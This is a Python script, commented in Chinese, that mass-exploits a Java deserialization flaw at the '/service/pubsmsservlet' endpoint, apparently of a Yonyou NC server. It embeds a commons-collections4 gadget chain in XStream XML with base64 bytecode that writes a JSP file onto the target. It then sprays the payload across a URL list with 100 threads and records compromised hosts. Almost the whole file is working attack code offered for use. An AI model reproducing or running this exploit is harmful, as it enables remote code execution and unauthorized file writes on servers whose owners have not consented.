import requests
import threading
from urllib.parse import urljoin
import urllib3
import sys

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Poc数据
POC_DATA = '''<org.apache.commons.collections4.bag.TreeBag serialization="custom">
  <unserializable-parents>
    <size>2</size>
  </unserializable-parents>
  <org.apache.commons.collections4.bag.TreeBag>
    <default/>
    <org.apache.commons.collections4.comparators.TransformingComparator>
      <decorated class="org.apache.commons.collections4.comparators.ComparableComparator"/>
      <transformer class="org.apache.commons.collections4.functors.ChainedTransformer">
        <iTransformers>
          <org.apache.commons.collections4.functors.ConstantTransformer>
            <iConstant class="java-class">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</iConstant>
          </org.apache.commons.collections4.functors.ConstantTransformer>
          <org.apache.commons.collections4.functors.InstantiateTransformer>
            <iParamTypes>
              <java-class>javax.xml.transform.Templates</java-class>
            </iParamTypes>
            <iArgs>
              <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization="custom">
                <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                  <default>
                    <__name>a</__name>
                    <__bytecodes>
                      <byte-array>yv66vgAAADQAcwoAHQAyBwAzCAA0CgA1ADYJADcAOAgAOQoAOgA7CAA8BwA9CgAJADIKAD4APwoACQBACgAJAEEKAAkAQgoAQwBECgBFAEYJADcARwoAPgBICABJCABKBwBLCgAVAEwHAE0KABcATgoAFwBPCgAXAEgKABUASAcAUAcAUQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwBSAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQANU3RhY2tNYXBUYWJsZQcAUwcAPQcAVAcAVQEACDxjbGluaXQ+BwBQAQAKU291cmNlRmlsZQEAFnB1YnNtc3NlcnZsZXRfZXhwLmphdmEMAB4AHwEAEXB1YnNtc3NlcnZsZXRfZXhwAQAYL3B1YnNtc3NlcnZsZXRfZXhwLmNsYXNzBwBWDABXAFgHAFkMAFoAWwEAR+mUmeivrzog5peg5rOV5LuOIGNsYXNzcGF0aCDkuK3mib7liLAgcHVic21zc2VydmxldF9leHAuY2xhc3Mg5paH5Lu244CCBwBcDABdAF4BAF/or7fnoa7kv50gcHVic21zc2VydmxldF9leHAuY2xhc3Mg5bey57yW6K+R77yM5bm25LiU5Zyo6L+Q6KGMIEpBUiDml7YgY2xhc3NwYXRoIOiuvue9ruato+ehruOAggEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwBTDABfAGAMAGEAYgwAYwAfDABkAGUHAGYMAGcAagcAawwAbABtDABuAFsMAG8AHwEAJEQ6XFU4Q0VSUFx3ZWJhcHBzXHU4Y193ZWJcZXJyb3IxLmpzcAECDTwlQCBwYWdlIGNvbnRlbnRUeXBlPSJ0ZXh0L2h0bWw7Y2hhcnNldD1nYjIzMTIiICU+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iemgtY24iPiA8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1nYjIzMTIiPiA8dGl0bGU+TkM8L3RpdGxlPiA8L2hlYWQ+IDxib2R5PiA8ZGl2IGFsaWduPSJjZW50ZXIiPiDmirHmrYnvvIzlj5HnlJ/plJnor6/vvIFpZDogPCVvdXQucHJpbnRsbihqYXZhLnV0aWwuVVVJRC5yYW5kb21VVUlEKCkudG9TdHJpbmcoKSk7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPiA8L2Rpdj4gPGRpdiBhbGlnbj0iY2VudGVyIj4gPGZvbnQgc3R5bGU9IkJBQ0tHUk9VTkQtQ09MT1I6ICNmZmZmZmQiIGNvbG9yPSIjMDAwMGZmIiBzaXplPSI0Ij48L2ZvbnQ+PC9kaXY+IDwvYm9keT4gPC9odG1sPgEAEmphdmEvaW8vRmlsZVdyaXRlcgwAHgBwAQATamF2YS9pby9QcmludFdyaXRlcgwAHgBxDAByAF4BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAJbQgEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA9qYXZhL2xhbmcvQ2xhc3MBABNnZXRSZXNvdXJjZUFzU3RyZWFtAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9pby9JbnB1dFN0cmVhbTsBABBqYXZhL2xhbmcvU3lzdGVtAQADZXJyAQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARyZWFkAQAHKFtCSUkpSQEABXdyaXRlAQAHKFtCSUkpVgEABWZsdXNoAQALdG9CeXRlQXJyYXkBAAQoKVtCAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAA291dAEABWNsb3NlAQAWKExqYXZhL2xhbmcvU3RyaW5nO1opVgEAEyhMamF2YS9pby9Xcml0ZXI7KVYBAAVwcmludAAhAAIAHQAAAAAABQABAB4AHwABACAAAAAdAAEAAQAAAAUqtwABsQAAAAEAIQAAAAYAAQAAAAwAAQAiACMAAgAgAAAAGQAAAAMAAAABsQAAAAEAIQAAAAYAAQAAACQAJAAAAAQAAQAlAAEAIgAmAAIAIAAAABkAAAAEAAAAAbEAAAABACEAAAAGAAEAAAApACQAAAAEAAEAJQAJACcAKAACACAAAADkAAQABwAAAGgSAhIDtgAETCvHABSyAAUSBrYAB7IABRIItgAHsbsACVm3AApNEQQAvAg6BCsZBAMZBL62AAtZPgKfAA4sGQQDHbYADKf/6Cy2AA0stgAOOgW4AA8ZBbYAEDoGsgARGQa2AAcrtgASsQAAAAIAIQAAAD4ADwAAAC0ACAAvAAwAMAAUADEAHAAyAB0ANgAlADgALAA5ADwAOgBHADwASwA9AFEAQABbAEEAYwBCAGcAQwApAAAAJgAD/AAdBwAq/gAOBwArAAcALP8AGgAFBwAtBwAqBwArAQcALAAAACQAAAAEAAEAHAAIAC4AHwABACAAAAB8AAQABAAAACsSE0sSFEy7ABVZKgO3ABZNuwAXWSy3ABhOLSu2ABkttgAaLLYAG6cABEuxAAEAAAAmACkAHAACACEAAAAqAAoAAAARAAMAEgAGABQAEAAVABkAFgAeABcAIgAYACYAHQApABoAKgAeACkAAAAHAAJpBwAvAAACADAAAAACADEAaQAAAAoAAQBFAEMAaAAJ</byte-array>
                    </__bytecodes>
                    <__transletIndex>-1</__transletIndex>
                    <__indentNumber>0</__indentNumber>
                  </default>
                  <boolean>false</boolean>
                </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
              </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
            </iArgs>
          </org.apache.commons.collections4.functors.InstantiateTransformer>
        </iTransformers>
      </transformer>
    </org.apache.commons.collections4.comparators.TransformingComparator>
    <int>1</int>
    <int>1</int>
    <int>2</int>
  </org.apache.commons.collections4.bag.TreeBag>
</org.apache.commons.collections4.bag.TreeBag>'''

# 线程锁
lock = threading.Lock()

def check_vulnerability(url):
    """
    检测单个URL的漏洞
    """
    try:
        # 构造目标URL
        target_url = urljoin(url.strip(), '/service/pubsmsservlet')
        
        # 设置请求头
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # 发送POST请求
        session = requests.Session()
        session.verify = False  # 禁用SSL验证
        
        print(f"正在检测: {target_url}")
        
        # 第一步：发送POC数据
        response1 = session.post(target_url, data=POC_DATA, headers=headers, timeout=10, allow_redirects=False)
        
        # 检查状态码
        if 300 <= response1.status_code < 400:
            with lock:
                print(f"[INFO] {url} - 状态码{response1.status_code}，不存在漏洞")
            return
        
        # 检查响应内容
        if response1.status_code == 200 and '<TronFlag>1</TranFlag>' in response1.text:
            print(f"[可能存在漏洞] {url} - 第一步检测通过")
            
            # 第二步：访问error1.jsp
            error_url = urljoin(url.strip(), '/error1.jsp')
            response2 = session.get(error_url, timeout=10, allow_redirects=False)
            
            if 300 <= response2.status_code < 400:
                with lock:
                    print(f"[INFO] {url} - error1.jsp状态码{response2.status_code}，不存在漏洞")
                return
            
            if response2.status_code == 200:
                # 漏洞存在，写入结果文件
                result = f"漏洞存在: {url}\n"
                result += f"POC URL: {target_url}\n"
                result += f"Error页面: {error_url}\n"
                result += f"第一步状态码: {response1.status_code}\n"
                result += f"第二步状态码: {response2.status_code}\n"
                result += "-" * 50 + "\n"
                
                with lock:
                    with open('result.txt', 'a', encoding='utf-8') as f:
                        f.write(result)
                    print(f"[漏洞存在] {url} - 已写入result.txt")
            else:
                with lock:
                    print(f"[INFO] {url} - error1.jsp状态码{response2.status_code}，不存在漏洞")
        else:
            with lock:
                print(f"[INFO] {url} - 第一步检测未通过，状态码{response1.status_code}")
    
    except requests.exceptions.RequestException as e:
        with lock:
            print(f"[ERROR] {url} - 请求失败: {str(e)}")
    except Exception as e:
        with lock:
            print(f"[ERROR] {url} - 发生错误: {str(e)}")

def main():
    """
    主函数
    """
    try:
        # 读取URL列表
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = f.readlines()
        
        if not urls:
            print("url.txt文件中没有找到URL")
            return
        
        print(f"共读取到 {len(urls)} 个URL")
        print("开始漏洞检测...")
        
        # 清空结果文件
        open('result.txt', 'w').close()
        
        # 创建线程池
        threads = []
        max_threads = 100
        
        for url in urls:
            url = url.strip()
            if not url:
                continue
                
            # 等待线程数量低于最大值
            while threading.active_count() > max_threads:
                threading.Event().wait(0.1)
            
            # 创建新线程
            thread = threading.Thread(target=check_vulnerability, args=(url,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # 等待所有线程完成
        for thread in threads:
            thread.join()
        
        print("漏洞检测完成！")
        
    except FileNotFoundError:
        print("找不到url.txt文件")
    except Exception as e:
        print(f"程序执行出错: {str(e)}")

if __name__ == "__main__":
    main()